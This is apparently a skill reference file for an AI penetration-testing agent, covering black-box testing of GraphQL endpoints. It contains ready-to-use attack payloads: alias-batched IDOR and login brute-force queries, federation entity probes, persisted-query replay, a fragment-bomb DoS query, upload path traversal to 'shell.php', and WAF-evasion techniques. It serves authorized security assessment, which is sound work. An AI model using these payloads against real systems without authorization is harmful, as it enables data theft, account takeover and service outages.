---
name: GraphQL Security
description: Reference for GraphQL endpoint testing covering introspection, alias-batched IDOR, resolver auth gaps, federation entity probes, persisted-query abuse, and complexity DoS.
---

# GraphQL Security

Reference for black-box testing of GraphQL APIs. Pull this in when the target exposes a `/graphql` (or similar) endpoint and you need a probe matrix for resolver authorization, batching, federation, persisted queries, and subscription transport gaps.

> Black-box scope: every probe drives the API over HTTP, WebSocket, or multipart. There is no source-code analysis step; for static review of GraphQL resolvers run `/skill semgrep` against an operator-supplied repo.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Send queries / mutations / introspection | `execute_curl` | POST `Content-Type: application/json`, body `{"query":"..."}`. |
| Automated GraphQL audit | `kali_shell graphql-cop` | `graphql-cop -t https://target.tld/graphql -o /tmp/gqlcop.json`. |
| Schema-aware exploitation | `kali_shell graphqlmap` | `graphqlmap -u https://target.tld/graphql --method POST`. |
| WebSocket subscriptions | `execute_code` | `websockets` lib in Python; subprotocols `graphql-ws` or `graphql-transport-ws`. |
| Pull existing endpoints from the graph | `query_graph` | "Return endpoints whose path contains 'graphql' or response body contains '__typename'." |

## Endpoint discovery

Common locations:

```
POST /graphql
POST /api/graphql
POST /v1/graphql
POST /v2/graphql
POST /gql
POST /query
POST /api
GET  /graphql?query=%7B__typename%7D
```

Liveness probe:

```
execute_curl url: "https://target.tld/graphql" method: "POST" headers: "Content-Type: application/json" data: "{\"query\":\"{__typename}\"}"
```

A response body of `{"data":{"__typename":"Query"}}` (or `Mutation`/`Subscription`) confirms a real GraphQL server. Note error shape: Apollo, Hasura, GraphQL Yoga, gqlgen, Strawberry, Graphene, Lighthouse all leak themselves through error wording.

Exposed GraphiQL / Apollo Sandbox / Playground:

```
GET /graphql                 (browser-rendered playground)
GET /altair                  (Altair playground)
GET /apollo-sandbox          (Apollo Sandbox embedded)
```

If a credentialed cross-origin request is allowed (CORS + cookies), the playground itself becomes a data exfil oracle.

## Schema acquisition

### Introspection enabled

```graphql
query IntrospectionFull {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { name kind fields { name args { name type { name kind ofType { name } } } type { name kind ofType { name } } } }
    directives { name args { name } locations }
  }
}
```

Save the result and convert to SDL with `kali_shell graphql-inspector` (if installed) or a Python helper.

### Introspection disabled

Inference signals to mine:

| Signal | Probe |
|---|---|
| Field-suggestion errors | Submit close misses; servers reply "Did you mean ...?" |
| Type-coercion errors | `{user(id: "abc"){id}}` reveals expected scalar |
| "Expected one of" errors | Reveal enum values |
| Different error codes for "unknown field" vs "unauthorized field" | Existence oracle |
| `__typename` probes | Add `__typename` to suspected fields to confirm shape |

`kali_shell graphql-cop` runs these inference probes for you.

## Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive these probes from the recorded `/graphql` POSTs instead of rebuilding queries by hand. proxy_brain tools only see traffic that went through the capture proxy, so run the app's GraphQL calls through it first.

- `redamon.search({"q":"graphql","method":"POST"})` lists the captured operations; `redamon.get(id,"both")` shows the exact query body and auth context to mutate.
- Aliased dual-fetch auth-swap: take a captured single-object query and replay it with both aliases plus a swapped identity: `redamon.replay(<query_txn>, {"body":"{\"query\":\"query { own: order(id:\\\"OWN\\\"){id owner{email}} foreign: order(id:\\\"FOREIGN\\\"){id owner{email}} }\"}","headers":{"Authorization":"Bearer <userB>"}})`, then `redamon.diff(<owner_txn>, <replay_txn>)` to prove missing per-edge authorization.
- Body-mutation probes on a captured POST: over-posting (add `isAdmin:true` / `role:"admin"` / `tenantId` to the input object), the federation `_entities` probe, and persisted-query replay all go through `redamon.replay(<graphql_txn>, {"body":"<mutated JSON>"})`, one shape per replay.
- `redamon.grep("persistedQuery")` and `redamon.grep("sha256Hash")` pull persisted-query hashes out of captured JS bundles / responses, feeding the persisted-query replay in the attack matrix.
- `redamon.to_curl(id)` renders the winning operation for the report.

Caveat: redamon.replay pins host/scheme/port to the origin, so probing a subgraph on a different internal host, or the WebSocket subscription transport, still needs execute_curl / execute_code. redamon.fuzz only iterates a query-string parameter, so alias / batch brute force is done by iterating redamon.replay bodies.

## Attack matrix

### Authorization

| Class | Probe |
|---|---|
| Field-level IDOR | Single request with two aliases asking for owned vs foreign object |
| Child-resolver gap | Parent enforces auth, child does not. Walk nested edges with foreign IDs |
| Relay node | Decode base64 global IDs (`Type:id`), swap type or id |
| Cursor tampering | Decode `after` / `before` cursors; many are base64 JSON with id/offset |
| Mutation IDOR | Mutations accepting `userId` / `orgId` from input, not derived from token |

Aliased dual-fetch:

```graphql
query DualFetch {
  own:    order(id:"OWN_ID")     { id total owner { email } }
  foreign:order(id:"FOREIGN_ID") { id total owner { email } }
}
```

A response containing `foreign.id` proves missing per-edge authorization.

Child-resolver bypass:

```graphql
query ChildLeak {
  user(id:"FOREIGN_ID") {
    id
    privateData { secrets ssn billingAddress }
  }
}
```

### Batching and aliases

GraphQL servers commonly skip per-request rate limits because aliasing lets one request fire N resolvers.

```graphql
query Brute {
  l1:login(user:"alice", password:"P1") { token }
  l2:login(user:"alice", password:"P2") { token }
  l3:login(user:"alice", password:"P3") { token }
  l4:login(user:"alice", password:"P4") { token }
}
```

Array-batching (non-standard, Apollo-specific):

```
[ {"query":"mutation { ... }"}, {"query":"mutation { ... }"}, ... ]
```

If accepted, partial-failure semantics let you bypass per-mutation guards.

### Input manipulation

| Technique | Payload |
|---|---|
| Type confusion | `{id:123}` vs `{id:"123"}` vs `{id:[123]}` vs `{id:null}` |
| Negative / zero | `{id:0}`, `{id:-1}`, `{count:-1}` |
| Duplicate JSON keys | `{"id":1,"id":2}` last-wins vs first-wins per parser |
| Extra input fields | Add `isAdmin:true`, `role:"admin"`, `tenantId:"other"` to input objects |
| Default arg tampering | Omit args that have server-side defaults; check whether defaults bypass auth |

### Directive abuse

`@defer` / `@stream` may stream gated data via incremental delivery:

```graphql
query DeferProbe {
  me { id email }
  ... @defer { adminPanel { secrets users { email role } } }
}
```

Custom directives (`@auth`, `@private`, `@hasRole`) often annotate intent without enforcement; verify by removing them or pointing them at fields they should gate.

### Federation

Apollo Federation exposes `_service` (SDL) and `_entities` (entity materialization across subgraphs).

```graphql
query SDLDump { _service { sdl } }
```

```graphql
query EntityProbe {
  _entities(representations:[
    {__typename:"User", id:"TARGET_ID"},
    {__typename:"Account", id:"OTHER_TENANT_ID"}
  ]) {
    ... on User { id email roles }
    ... on Account { id balance }
  }
}
```

Subgraph resolvers commonly lack the auth checks the gateway applies. The `_entities` path bypasses the gateway when a subgraph is reachable directly.

### Persisted queries

| Probe | Outcome |
|---|---|
| Strip the `extensions.persistedQuery.sha256Hash` and supply the raw query | Hash allowlist ignored |
| Reuse a leaked client hash from the JS bundle with attacker variables | Privileged operation replay |
| Brute the hash for common operations (`user`, `me`, `getOrder`) | Hash leak |
| APQ "register and execute" race | Attacker-registered query persists if registration is unauthenticated |

```
POST /graphql {"extensions":{"persistedQuery":{"version":1,"sha256Hash":"<leaked_hash>"}},"variables":{"id":"FOREIGN"}}
```

### Subscriptions

```
WebSocket subprotocols:
  graphql-ws
  graphql-transport-ws
```

Common gaps:

| Probe | Outcome |
|---|---|
| Authenticate at handshake, drop credentials at first `subscribe` message | Per-message auth missing |
| Subscribe to other-user channels (`room:USER_B`, `org:OTHER_ORG`) | Filter args trusted |
| Replay a previously-validated `connection_init` payload | Token reuse |
| Cross-tenant event leakage | Subscribe across orgs and watch the broadcast bus |

```
execute_code language: python
import asyncio, json, websockets
async def go():
    async with websockets.connect("wss://target.tld/graphql", subprotocols=["graphql-transport-ws"]) as ws:
        await ws.send(json.dumps({"type":"connection_init","payload":{"authorization":"Bearer <token>"}}))
        await ws.send(json.dumps({"id":"1","type":"subscribe","payload":{"query":"subscription { newOrder { id userId total } }"}}))
        for _ in range(20):
            print(await ws.recv())
asyncio.run(go())
```

### Complexity attacks

Fragment bomb (use carefully and only with explicit operator approval; this is DoS-class):

```graphql
fragment x on User { friends { ...x } }
query { me { ...x } }
```

Wide selection sets through fragments force overfetching of sensitive subfields. Confirm a depth/complexity limit is in place before scaling.

### CORS and CSRF

Cookie-authenticated GraphQL is CSRF-prone if it accepts:
- GET queries with `query=` parameter (mutations behind a GET).
- POST `application/x-www-form-urlencoded` or `multipart/form-data` (no preflight).
- Persisted queries via GET.

GraphiQL/Playground with `Access-Control-Allow-Credentials: true` and a permissive origin is a data exfil endpoint; visit it from an attacker page and dump tokens.

### File uploads (graphql-multipart)

```
multipart/form-data:
  operations = {"query":"mutation($f:Upload!){upload(file:$f){url}}", "variables":{"f":null}}
  map        = {"0":["variables.f"]}
  0          = <binary>
```

Probes:

- Filename traversal: `../../../var/www/html/shell.php`.
- Content-type spoofing: send `image/jpeg` for `.svg` containing `<script>`.
- Oversize chunks; missing `X-Content-Type-Options: nosniff` on served URLs.
- Owner-scoping on returned URLs; replay across tenants.

## WAF evasion

| Reshape | Example |
|---|---|
| Block-string comments | `"""..."""` inside the query |
| Aliasing sensitive fields | `pw:password` to defeat keyword detection |
| Fragment splitting across name boundaries | `fragment a on User { e:email } fragment b on User { p:password }` |
| Variables vs inline args | Move payload from inline args to `$var` JSON variables |
| Transport switching | `Content-Type: application/graphql` vs `application/json` vs GET |
| Method override | `X-HTTP-Method-Override: POST` on GET endpoints |

## Validation shape

A clean GraphQL finding shows:

1. The exact request (URL, method, headers, body) including auth context (token / cookies).
2. A baseline response for the **owner** principal.
3. A response for a **non-owner** principal returning the same data, or an unauthenticated probe returning gated data.
4. Where applicable: the alias structure proving batching abuse, or the WebSocket frames proving subscription gap.
5. Schema location of the missing check (resolver / type / edge), expressed as the GraphQL path: `Query.user.privateData.secrets`.

## False positives

- Field-level errors with status `200` and `errors[].extensions.code == "FORBIDDEN"` mean auth is enforced; not a finding.
- Introspection enabled in non-production environments only (cross-check by host header / TLS cert).
- Federation subgraphs reachable only from the cluster network and not exposed externally.
- Persisted-query allowlist enforced AND signed (HMAC over the hash).

## Hand-off

```
graphql-cop -> /tmp/gqlcop.json                       # automated audit
graphqlmap -> interactive RCE / dump pivots
execute_code (websockets) -> subscription tests
execute_curl -> per-query confirm + alias matrix
```

For tokens issued by the GraphQL endpoint, pivot to `/skill jwt_attacks`. For OAuth-fronted flows, `/skill oauth_oidc`.
